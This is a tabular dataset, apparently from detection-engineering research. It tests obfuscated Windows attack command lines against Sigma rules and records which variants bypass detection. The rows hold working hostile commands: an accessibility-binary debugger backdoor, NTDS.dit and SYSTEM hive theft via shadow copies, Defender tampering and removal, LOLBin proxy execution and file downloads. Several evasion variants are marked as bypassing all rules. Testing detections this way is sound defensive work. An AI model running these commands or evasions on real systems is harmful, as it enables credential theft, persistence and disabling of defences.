Technical	Rule_name	Title	Rule_id	Command_match_rule	Commandline_evasion	Excutable	Bypass target rule	Bypass all rule	Trigger rule
t1546.008	proc_creation_win_registry_install_reg_debugger_backdoor	Suspicious Debugger Registration Cmdline	ae215552-081e-44c7-805f-be16f975c8a2		"""powershell.exe"" & {$input_table = ""osk.""""exe, sethc.""""exe, utilman.""""exe, magnify.""""exe, narrator.""""exe, DisplaySwitch.""""exe, atbroker.""""exe"".split("","")
$Name = ""Debugger""
$Value = ""C:\windows\system32\cmd.exe""
Foreach ($item in $input_table){
  $item = $item.trim() -replace '""""',''
  $registryPath = ""HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item""
  IF(!(Test-Path $registryPath))
  {
    New-Item -Path $registryPath -Force
    New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
  }
  ELSE
  {
    New-ItemProperty -Path $registryPath -Name $name -Value $Value
  }
}}"	FALSE	FALSE	FALSE	
t1546.008	proc_creation_win_registry_install_reg_debugger_backdoor	Suspicious Debugger Registration Cmdline	ae215552-081e-44c7-805f-be16f975c8a2		"""powershell.exe"" & {$input_table = @('osk','sethc','utilman','magnify','narrator','DisplaySwitch','atbroker') | ForEach-Object { ""$_`Reference"".Replace('Reference','.exe') }
$Name = ""Debugger""
$Value = ""C:\windows\system32\cmd.exe""
Foreach ($item in $input_table){
  $registryPath = ""HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item""
  New-Item -Path $registryPath -Force -ErrorAction Ignore
  New-ItemProperty -Path $registryPath -Name $Name -Value $Value -Force
}}"	FALSE	FALSE	FALSE	
t1490	proc_creation_win_cmd_shadowcopy_access	Copy From VolumeShadowCopy Via Cmd.EXE	c73124a7-3e89-44a3-bdc1-25fe4df754b1		"""cmd.exe"" /c ""copy ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Windows\Temp\VSC_SYSTEM_HIVE"	FALSE	FALSE	FALSE	
t1490	proc_creation_win_cmd_shadowcopy_access	Copy From VolumeShadowCopy Via Cmd.EXE	c73124a7-3e89-44a3-bdc1-25fe4df754b1		"""cmd.exe"" /c c^opy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Windows\Temp\VSC_SYSTEM_HIVE"	FALSE	FALSE	FALSE	
t1490	proc_creation_win_cmd_shadowcopy_access	Copy From VolumeShadowCopy Via Cmd.EXE	c73124a7-3e89-44a3-bdc1-25fe4df754b1		"""cmd.exe"" /c copy \\.\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Windows\Temp\VSC_SYSTEM_HIVE"	FALSE	FALSE	FALSE	
t1490	proc_creation_win_susp_sensitive_file_access_shadowcopy	Sensitive File Access Via Volume Shadow Copy Backup	f57f8d16-1f39-4dcb-a604-6c73d9b54b3d	"cmd.exe /c ""cmd.exe /c copy \""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy\""1\Windows\NTDS\NTDS.dit C:\Windows\Temp\ntds.dit"""	"cmd.exe /c copy ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy""1\Windows\NTDS\NTDS.dit C:\Windows\Temp\ntds.dit"	TRUE	FALSE	FALSE	Copy From VolumeShadowCopy Via Cmd.EXE (c73124a7-3e89-44a3-bdc1-25fe4df754b1); Copy From VolumeShadowCopy Via Cmd.EXE (c73124a7-3e89-44a3-bdc1-25fe4df754b1); Copying Sensitive Files with Credential Data (e7be6119-fc37-43f0-ad4f-1f3f99be2f9f); Copying Sensitive Files with Credential Data (e7be6119-fc37-43f0-ad4f-1f3f99be2f9f); Suspicious Process Patterns NTDS.DIT Exfil (8bc64091-6875-4881-aaf9-7bd25b5dda08); Suspicious Process Patterns NTDS.DIT Exfil (8bc64091-6875-4881-aaf9-7bd25b5dda08); Sensitive File Access Via Volume Shadow Copy Backup (f57f8d16-1f39-4dcb-a604-6c73d9b54b3d); Sensitive File Access Via Volume Shadow Copy Backup (f57f8d16-1f39-4dcb-a604-6c73d9b54b3d)
t1490	proc_creation_win_susp_sensitive_file_access_shadowcopy	Sensitive File Access Via Volume Shadow Copy Backup	f57f8d16-1f39-4dcb-a604-6c73d9b54b3d	"cmd.exe /c ""powershell.exe -Command \""$vsc = '\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy'; $file = '\NTDS.dit'; copy-item ($vsc + '1\Windows\NTDS' + $file) -Destination C:\Windows\Temp\ntds.dit\"""""	"powershell.exe -Command ""$vsc = '\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy'; $file = '\NTDS.dit'; copy-item ($vsc + '1\Windows\NTDS' + $file) -Destination C:\Windows\Temp\ntds.dit"""	TRUE	FALSE	FALSE	Suspicious Process Patterns NTDS.DIT Exfil (8bc64091-6875-4881-aaf9-7bd25b5dda08); Suspicious Process Patterns NTDS.DIT Exfil (8bc64091-6875-4881-aaf9-7bd25b5dda08); Suspicious Script Execution From Temp Folder (a6a39bdb-935c-4f0a-ab77-35f4bbf44d33); Sensitive File Access Via Volume Shadow Copy Backup (f57f8d16-1f39-4dcb-a604-6c73d9b54b3d); Sensitive File Access Via Volume Shadow Copy Backup (f57f8d16-1f39-4dcb-a604-6c73d9b54b3d); Copy From Or To Admin Share Or Sysvol Folder (855bc8b5-2ae8-402e-a9ed-b889e6df1900); Copy From Or To Admin Share Or Sysvol Folder (855bc8b5-2ae8-402e-a9ed-b889e6df1900); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1490	proc_creation_win_susp_sensitive_file_access_shadowcopy	Sensitive File Access Via Volume Shadow Copy Backup	f57f8d16-1f39-4dcb-a604-6c73d9b54b3d		"cmd.exe /c ""set vsc=\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy&& call copy %%vsc%%1\Windows\System32\config\SYSTEM C:\Windows\Temp\SYSTEM_VSC"""	FALSE	FALSE	FALSE	
t1490	proc_creation_win_susp_sensitive_file_access_shadowcopy	Sensitive File Access Via Volume Shadow Copy Backup	f57f8d16-1f39-4dcb-a604-6c73d9b54b3d	"cmd.exe /c ""cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYS\""\""TEM C:\Windows\Temp\VSC_SYSTEM_HIVE"""	"cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYS""""TEM C:\Windows\Temp\VSC_SYSTEM_HIVE"	TRUE	FALSE	FALSE	Copy From VolumeShadowCopy Via Cmd.EXE (c73124a7-3e89-44a3-bdc1-25fe4df754b1); Copy From VolumeShadowCopy Via Cmd.EXE (c73124a7-3e89-44a3-bdc1-25fe4df754b1); Sensitive File Access Via Volume Shadow Copy Backup (f57f8d16-1f39-4dcb-a604-6c73d9b54b3d); Sensitive File Access Via Volume Shadow Copy Backup (f57f8d16-1f39-4dcb-a604-6c73d9b54b3d); Suspicious Copy From or To System Directory (fff9d2b7-e11c-4a69-93d3-40ef66189767); Suspicious Copy From or To System Directory (fff9d2b7-e11c-4a69-93d3-40ef66189767)
t1082	proc_creation_win_discovery_via_reg_queries	System Information Discovery via Registry Queries	0022869c-49f7-4ff2-ba03-85ac42ddac58	"reg  query \""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\\\"" /v CurrentBuildNumber"	"reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\"" /v CurrentBuildNumber"	TRUE	FALSE	FALSE	System Information Discovery via Registry Queries (0022869c-49f7-4ff2-ba03-85ac42ddac58)
t1082	proc_creation_win_discovery_via_reg_queries	System Information Discovery via Registry Queries	0022869c-49f7-4ff2-ba03-85ac42ddac58	"reg  query \""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\"" /v\""\""CurrentBuildNumber"	"reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"" /v""""CurrentBuildNumber"	TRUE	FALSE	FALSE	System Information Discovery via Registry Queries (0022869c-49f7-4ff2-ba03-85ac42ddac58)
t1082	proc_creation_win_discovery_via_reg_queries	System Information Discovery via Registry Queries	0022869c-49f7-4ff2-ba03-85ac42ddac58		"powershell.exe -Command ""Get-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion' | Select-Object -ExpandProperty CurrentBuildNumber"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1082	proc_creation_win_dtrace_kernel_dump	Suspicious Kernel Dump Using Dtrace	7124aebe-4cd7-4ccb-8df0-6d6b93c96795		"dtrace.exe -w ""syscall:::return {lkd(0x0); exit(0);}"""	FALSE	FALSE	FALSE	
t1082	proc_creation_win_dtrace_kernel_dump	Suspicious Kernel Dump Using Dtrace	7124aebe-4cd7-4ccb-8df0-6d6b93c96795		"dtrace.exe -w ""syscall:::return {lkd( 0 ); exit(0);}"""	FALSE	FALSE	FALSE	
t1082	proc_creation_win_dtrace_kernel_dump	Suspicious Kernel Dump Using Dtrace	7124aebe-4cd7-4ccb-8df0-6d6b93c96795		"dtrace.exe -w ""syscall:::return {lkd(0); exit(0);}"""	FALSE	FALSE	FALSE	
t1562.001	proc_creation_win_dism_remove	Dism Remove Online Package	43e32da2-fdd0-4156-90de-50dfd62636f9		Dism -Online -Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet	TRUE	TRUE	TRUE	
t1562.001	proc_creation_win_dism_remove	Dism Remove Online Package	43e32da2-fdd0-4156-90de-50dfd62636f9	"Dism  \""/Online\"" \""/Disable-Feature\"" /FeatureName:Windows-Defender /Remove /NoRestart /quiet"	"Dism ""/Online"" ""/Disable-Feature"" /FeatureName:Windows-Defender /Remove /NoRestart /quiet"	TRUE	FALSE	FALSE	Dism Remove Online Package (43e32da2-fdd0-4156-90de-50dfd62636f9)
t1562.001	proc_creation_win_dism_remove	Dism Remove Online Package	43e32da2-fdd0-4156-90de-50dfd62636f9	Dism  /Online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet	cmd /c Dism /On^line /Disable-Fe^ature /FeatureName:Windows-Defender /Remove /NoRestart /quiet	TRUE	FALSE	FALSE	Dism Remove Online Package (43e32da2-fdd0-4156-90de-50dfd62636f9); Dism Remove Online Package (43e32da2-fdd0-4156-90de-50dfd62636f9)
t1562.001	proc_creation_win_reg_windows_defender_tamper	Suspicious Windows Defender Registry Key Tampering Via Reg.EXE	452bce90-6fb0-43cc-97a5-affc283139b3	"reg  add \""HKLM\SOFTWARE\Microsoft\Windows Defender\Features\"" /v \""TamperProtection\"" /t REG_DWORD /d 0 /f"	"reg add ""HKLM\SOFTWARE\Microsoft\Windows Defender\Features"" /v ""TamperProtection"" /t REG_DWORD /d 0 /f"	TRUE	FALSE	FALSE	Reg Add Suspicious Paths (b7e2a8d4-74bb-4b78-adc9-3f92af2d4829); Suspicious Windows Defender Registry Key Tampering Via Reg.EXE (452bce90-6fb0-43cc-97a5-affc283139b3)
t1562.001	proc_creation_win_reg_windows_defender_tamper	Suspicious Windows Defender Registry Key Tampering Via Reg.EXE	452bce90-6fb0-43cc-97a5-affc283139b3	"reg   add  \""HKLM\SOFTWARE\Microsoft\Windows Defender\Features\"" /v \""TamperProtection\"" /t REG_DWORD /d 0 /f"	"reg  add  ""HKLM\SOFTWARE\Microsoft\Windows Defender\Features"" /v ""TamperProtection"" /t REG_DWORD /d 0 /f"	TRUE	FALSE	FALSE	Reg Add Suspicious Paths (b7e2a8d4-74bb-4b78-adc9-3f92af2d4829); Suspicious Windows Defender Registry Key Tampering Via Reg.EXE (452bce90-6fb0-43cc-97a5-affc283139b3)
t1562.001	proc_creation_win_reg_windows_defender_tamper	Suspicious Windows Defender Registry Key Tampering Via Reg.EXE	452bce90-6fb0-43cc-97a5-affc283139b3	"reg  add \""HKLM\SOFTWARE\Microsoft\Windows Defender\Features\"" /v \""TamperProtection\"" /t REG_DWORD /d 0x0 /f"	"reg add ""HKLM\SOFTWARE\Microsoft\Windows Defender\Features"" /v ""TamperProtection"" /t REG_DWORD /d 0x0 /f"	TRUE	FALSE	FALSE	Reg Add Suspicious Paths (b7e2a8d4-74bb-4b78-adc9-3f92af2d4829); Suspicious Windows Defender Registry Key Tampering Via Reg.EXE (452bce90-6fb0-43cc-97a5-affc283139b3)
t1482	proc_creation_win_dsquery_domain_trust_discovery	Domain Trust Discovery Via Dsquery	3bad990e-4848-4a78-9530-b427d854aac0		"dsquery * -filter ""(objectClass=1.2.840.113556.1.5.43)"" -attr *"	FALSE	FALSE	FALSE	
t1482	proc_creation_win_dsquery_domain_trust_discovery	Domain Trust Discovery Via Dsquery	3bad990e-4848-4a78-9530-b427d854aac0		"dsquery * -filter ""(objectClass=trusted""""Domain)"" -attr *"	FALSE	FALSE	FALSE	
t1482	proc_creation_win_dsquery_domain_trust_discovery	Domain Trust Discovery Via Dsquery	3bad990e-4848-4a78-9530-b427d854aac0		"cmd.exe /c ""dsquery * -filter ""(objectClass=trusted^Domain)"" -attr *"""	FALSE	FALSE	FALSE	
t1218	proc_creation_win_expand_cabinet_files	Potentially Suspicious Cabinet File Expansion	9f107a84-532c-41af-b005-8d12a607639f	"expand  \""C:\Users	haim\AppData\Local\Temp\art-expand-test.cab\"" /F:* ."	"expand ""C:\Users	haim\AppData\Local\Temp\art-expand-test.cab"" /F:* ."	TRUE	FALSE	FALSE	Potentially Suspicious Cabinet File Expansion (9f107a84-532c-41af-b005-8d12a607639f)
t1218	proc_creation_win_expand_cabinet_files	Potentially Suspicious Cabinet File Expansion	9f107a84-532c-41af-b005-8d12a607639f	"expand  \""C:\Users	haim\AppData\Local\Temp\art-expand-test.cab\"" -F:* ."	"expand ""C:\Users	haim\AppData\Local\Temp\art-expand-test.cab"" -F:* ."	TRUE	FALSE	FALSE	Potentially Suspicious Cabinet File Expansion (9f107a84-532c-41af-b005-8d12a607639f)
t1218	proc_creation_win_expand_cabinet_files	Potentially Suspicious Cabinet File Expansion	9f107a84-532c-41af-b005-8d12a607639f		"expand ""C:\Users	haim\AppData\Local\Temp\art-expand-test.cab"" -F ""*"" ."	TRUE	TRUE	TRUE	
t1218	proc_creation_win_imewbdld_download	Arbitrary File Download Via IMEWDBLD.EXE	863218bd-c7d0-4c52-80cd-0a96c09f54af		"""C:\WINDOWS\System32\IME\SHARED\IMEWDBLD.exe"" h""""ttps://[raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml](https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml)"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_imewbdld_download	Arbitrary File Download Via IMEWDBLD.EXE	863218bd-c7d0-4c52-80cd-0a96c09f54af		"cmd.exe /c """"C:\WINDOWS\System32\IME\SHARED\IMEWDBLD.exe"" htt^ps://[raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml](https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml)"""	FALSE	FALSE	FALSE	
t1218	proc_creation_win_imewbdld_download	Arbitrary File Download Via IMEWDBLD.EXE	863218bd-c7d0-4c52-80cd-0a96c09f54af		"""C:\WINDOWS\System32\IME\SHARED\IMEWDBLD.exe"" //[raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml](https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml)"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_infdefaultinstall_execute_sct_scripts	InfDefaultInstall.exe .inf Execution	ce7cf472-6fcc-490a-9481-3786840b5d9b	"cmd.exe /c ""InfDefaultInstall.exe  \""C:\AtomicRedTeam\atomics\T1218\src\Infdefaultinstall.inf\"""""	"InfDefaultInstall.exe  ""C:\AtomicRedTeam\atomics\T1218\src\Infdefaultinstall.inf"""	TRUE	FALSE	FALSE	InfDefaultInstall.exe .inf Execution (ce7cf472-6fcc-490a-9481-3786840b5d9b); InfDefaultInstall.exe .inf Execution (ce7cf472-6fcc-490a-9481-3786840b5d9b)
t1218	proc_creation_win_infdefaultinstall_execute_sct_scripts	InfDefaultInstall.exe .inf Execution	ce7cf472-6fcc-490a-9481-3786840b5d9b		"InfDefaultInstall.exe ""C:\AtomicRedTeam\atomics\T1218\src\Infdefaultinstall.in""""f"""	TRUE	TRUE	TRUE	
t1218	proc_creation_win_infdefaultinstall_execute_sct_scripts	InfDefaultInstall.exe .inf Execution	ce7cf472-6fcc-490a-9481-3786840b5d9b		"cmd.exe /c ""InfDefaultInstall.exe ""C:\AtomicRedTeam\atomics\T1218\src\Infdefaultinstall.in^f"""""	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_syncappvpublishingserver_vbs_execute_psh	SyncAppvPublishingServer VBS Execute Arbitrary PowerShell Code	36475a7d-0f6d-4dce-9b01-6aeb473bbaf1		"C:\windows\system32\SyncAppvPublishingServer.vbs ""
%3bStart-Process calc"""	FALSE	FALSE	FALSE	
t1218	proc_creation_win_lolbin_syncappvpublishingserver_vbs_execute_psh	SyncAppvPublishingServer VBS Execute Arbitrary PowerShell Code	36475a7d-0f6d-4dce-9b01-6aeb473bbaf1	"cmd.exe /c ""cscript.exe //B C:\Windows\System32\Printing_Admin_Scripts\en-US\..\..\SyncAppvPublishingServer.vbs \""
;Start-Process calc\"""""	"cscript.exe //B C:\Windows\System32\Printing_Admin_Scripts\en-US\..\..\SyncAppvPublishingServer.vbs ""
;Start-Process calc"""	TRUE	FALSE	FALSE	SyncAppvPublishingServer VBS Execute Arbitrary PowerShell Code (36475a7d-0f6d-4dce-9b01-6aeb473bbaf1); Potential Command Line Path Traversal Evasion Attempt (1327381e-6ab0-4f38-b583-4c1b8346a56b); Potential Command Line Path Traversal Evasion Attempt (1327381e-6ab0-4f38-b583-4c1b8346a56b)
t1218	proc_creation_win_lolbin_syncappvpublishingserver_vbs_execute_psh	SyncAppvPublishingServer VBS Execute Arbitrary PowerShell Code	36475a7d-0f6d-4dce-9b01-6aeb473bbaf1		"""cmd.exe"" /c C:\windows\system32\SyncAppvPublishingServer.vbs ""
""';'""Start-Process calc"""	FALSE	FALSE	FALSE	
t1218	proc_creation_win_mofcomp_execution	Potential Suspicious Mofcomp Execution	1dd05363-104e-4b4a-b963-196a534b03a1		"""C:\windows\system32\wbem\mofcomp.exe"" C:\Users\Public\..\Public\T1546.003.mof"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_mofcomp_execution	Potential Suspicious Mofcomp Execution	1dd05363-104e-4b4a-b963-196a534b03a1		"""C:\windows\system32\wbem\mofcomp.exe"" ""C:\Users\Public""\T1546.003.mof"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_mofcomp_execution	Potential Suspicious Mofcomp Execution	1dd05363-104e-4b4a-b963-196a534b03a1		mofcomp.exe C:\WINDOWS\Temp\..\..\AtomicRedTeam\atomics\T1546.003\src\T1546.003.mof	TRUE	TRUE	FALSE	Potential Command Line Path Traversal Evasion Attempt (1327381e-6ab0-4f38-b583-4c1b8346a56b); Potential Command Line Path Traversal Evasion Attempt (1327381e-6ab0-4f38-b583-4c1b8346a56b)
t1218	proc_creation_win_mpcmdrun_download_arbitrary_file	File Download Via Windows Defender MpCmpRun.EXE	46123129-1024-423e-9fae-43af4a0fa9a5		"MpCmdRun.exe -DownloadFile -""url"" [https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt](https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt) -path C:\Users	haim\AppData\Local\Temp\Atomic-license.txt"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_mpcmdrun_download_arbitrary_file	File Download Via Windows Defender MpCmpRun.EXE	46123129-1024-423e-9fae-43af4a0fa9a5		"MpCmdRun.exe -""Download""""File"" -url [https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt](https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt) -path C:\Users	haim\AppData\Local\Temp\Atomic-license.txt"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_mpcmdrun_download_arbitrary_file	File Download Via Windows Defender MpCmpRun.EXE	46123129-1024-423e-9fae-43af4a0fa9a5		"cmd.exe /c ""MpCmdRun.exe -Down^loadFile -url [https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt](https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt) -path C:\Users	haim\AppData\Local\Temp\Atomic-license.txt"""	FALSE	FALSE	FALSE	
t1218	proc_creation_win_powershell_remotefxvgpudisablement_abuse	RemoteFXvGPUDisablement Abuse Via AtomicTestHarnesses	a6fc3c46-23b8-4996-9ea2-573f4c4d88c5		"""powershell.exe"" & {& 'Invoke-ATHRemoteFXvGPUDisablementCommand' -ModuleName foo -ModulePath $PWD}"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_powershell_remotefxvgpudisablement_abuse	RemoteFXvGPUDisablement Abuse Via AtomicTestHarnesses	a6fc3c46-23b8-4996-9ea2-573f4c4d88c5		"cmd.exe /c ""powershell.exe & {Invoke-ATHRemoteFXvGPUDisa^blementCommand -ModuleName foo -ModulePath $PWD}"""	FALSE	FALSE	FALSE	
t1218	proc_creation_win_powershell_remotefxvgpudisablement_abuse	RemoteFXvGPUDisablement Abuse Via AtomicTestHarnesses	a6fc3c46-23b8-4996-9ea2-573f4c4d88c5		"""powershell.exe"" & {Invoke-Expression ('Invoke-ATHRemoteFXv' + 'GPUDisablementCommand -ModuleName foo -ModulePath $PWD')}"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_registry_provlaunch_provisioning_command	Potential Provisioning Registry Key Abuse For Binary Proxy Execution	2a4b3e61-9d22-4e4a-b60f-6e8f0cde6f25	"cmd.exe /c ""\""cmd.exe\"" /c reg.exe add \""HKLM\SOFTWARE\Microsoft\Provisioning\Commands\\\""LOLBin\dummy1 /v altitude /t REG_DWORD /d 0 & reg add \""HKLM\SOFTWARE\Microsoft\Provisioning\Commands\\\""LOLBin\dummy1\dummy2 /v Commandline /d calc.exe & c:\windows\system32\provlaunch.exe LOLBin"""	"""cmd.exe"" /c reg.exe add ""HKLM\SOFTWARE\Microsoft\Provisioning\Commands\""LOLBin\dummy1 /v altitude /t REG_DWORD /d 0 & reg add ""HKLM\SOFTWARE\Microsoft\Provisioning\Commands\""LOLBin\dummy1\dummy2 /v Commandline /d calc.exe & c:\windows\system32\provlaunch.exe LOLBin"	TRUE	FALSE	FALSE	Potential Provisioning Registry Key Abuse For Binary Proxy Execution (2a4b3e61-9d22-4e4a-b60f-6e8f0cde6f25); Potential Provisioning Registry Key Abuse For Binary Proxy Execution (2a4b3e61-9d22-4e4a-b60f-6e8f0cde6f25)
t1218	proc_creation_win_registry_provlaunch_provisioning_command	Potential Provisioning Registry Key Abuse For Binary Proxy Execution	2a4b3e61-9d22-4e4a-b60f-6e8f0cde6f25	reg  add HKLM\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1\dummy2 /v Commandline /d calc.exe 	"""cmd.exe"" /c reg.exe add HKLM\SOF^TWARE\Micro^soft\Provi^sioning\Com^mands\LOLBin\dummy1 /v altitude /t REG_DWORD /d 0 & reg add HKLM\SOF^TWARE\Micro^soft\Provi^sioning\Com^mands\LOLBin\dummy1\dummy2 /v Commandline /d calc.exe & c:\windows\system32\provlaunch.exe LOLBin"	TRUE	FALSE	FALSE	Potential Provisioning Registry Key Abuse For Binary Proxy Execution (2a4b3e61-9d22-4e4a-b60f-6e8f0cde6f25)
t1218	proc_creation_win_registry_provlaunch_provisioning_command	Potential Provisioning Registry Key Abuse For Binary Proxy Execution	2a4b3e61-9d22-4e4a-b60f-6e8f0cde6f25	"cmd.exe /c ""powershell.exe -Command \""New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1' -Force; New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1' -Name 'altitude' -Value 0 -PropertyType DWord -Force; New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1\dummy2' -Force; New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1\dummy2' -Name 'Commandline' -Value 'calc.exe' -PropertyType String -Force; & c:\windows\system32\provlaunch.exe LOLBin\"""""	"powershell.exe -Command ""New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1' -Force; New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1' -Name 'altitude' -Value 0 -PropertyType DWord -Force; New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1\dummy2' -Force; New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1\dummy2' -Name 'Commandline' -Value 'calc.exe' -PropertyType String -Force; & c:\windows\system32\provlaunch.exe LOLBin"""	TRUE	FALSE	FALSE	Potential Provisioning Registry Key Abuse For Binary Proxy Execution (2a4b3e61-9d22-4e4a-b60f-6e8f0cde6f25); Potential Provisioning Registry Key Abuse For Binary Proxy Execution (2a4b3e61-9d22-4e4a-b60f-6e8f0cde6f25); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1218	proc_creation_win_ssh_proxy_execution	Program Executed Using Proxy/Local Command Via SSH.EXE	7d6d30b8-5b91-4b90-a891-46cccaf29598		"""C:\WINDOWS\System32\OpenSSH\ssh.exe"" -o ""PermitLocalCommand yes"" -o ""LocalCommand calc.exe"" adversary-host"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_ssh_proxy_execution	Program Executed Using Proxy/Local Command Via SSH.EXE	7d6d30b8-5b91-4b90-a891-46cccaf29598		"""C:\WINDOWS\System32\OpenSSH\ssh.exe"" -o Proxy""""Command=""calc.exe"" adversary-host"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_ssh_proxy_execution	Program Executed Using Proxy/Local Command Via SSH.EXE	7d6d30b8-5b91-4b90-a891-46cccaf29598		"cmd.exe /c ""C:\WINDOWS\System32\OpenSSH\ssh.exe"" -o Per^mitLocalCommand=yes -o LocalCommand=calc.exe adversary-host"	FALSE	FALSE	FALSE	
t1218	proc_creation_win_wuauclt_dll_loading	Proxy Execution Via Wuauclt.EXE	af77cf95-c469-471c-b6a0-946c685c4798		"cmd.exe /c wuauclt.exe /UpdateDe^ploymentProvider ""C:\AtomicRedTeam\atomics\T1218in\calc.dll"" /RunHandlerComServer"	TRUE	TRUE	TRUE	
t1218	proc_creation_win_wuauclt_dll_loading	Proxy Execution Via Wuauclt.EXE	af77cf95-c469-471c-b6a0-946c685c4798		"wuauclt.exe /""UpdateDeploymentProvider"" ""C:\AtomicRedTeam\atomics\T1218in\calc.dll"" /""RunHandlerComServer"""	TRUE	TRUE	TRUE	
t1218	proc_creation_win_wuauclt_dll_loading	Proxy Execution Via Wuauclt.EXE	af77cf95-c469-471c-b6a0-946c685c4798		"wuauclt.exe -UpdateDeploymentProvider ""C:\AtomicRedTeam\atomics\T1218in\calc.dll"" -RunHandlerComServer"	TRUE	TRUE	TRUE	
t1218	proc_creation_win_wuauclt_dll_loading	Proxy Execution Via Wuauclt.EXE	af77cf95-c469-471c-b6a0-946c685c4798		"wuauclt.exe /RunHandlerComServer /UpdateDeploymentProvider ""C:\AtomicRedTeam\atomics\T1218in\calc.dll"""	TRUE	TRUE	TRUE	
